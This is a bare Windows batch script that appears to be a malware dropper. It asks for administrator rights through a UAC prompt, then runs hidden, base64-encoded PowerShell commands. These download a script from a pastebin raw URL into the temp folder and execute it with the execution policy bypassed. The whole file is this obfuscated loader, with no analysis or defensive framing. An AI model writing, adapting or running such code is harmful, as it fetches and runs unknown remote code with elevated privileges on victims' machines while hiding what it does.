@echo off
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b

)

powershell -WindowStyle Hidden -NoLogo -enc KABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQB3AC8ASwBZAGQAUgByAFQAUwB4ACkALgBjAG8AbgB0AGUAbgB0ACAAPgAgACQAZQBuAHYAOgB0AGUAbQBwAFwAQQBtAC4AcABzADEA
powershell -WindowStyle Hidden -NoLogo -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAGUAeABpAHQAIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIAAkAGUAbgB2ADoAdABlAG0AcABcAEEAbQAuAHAAcwAxAA==
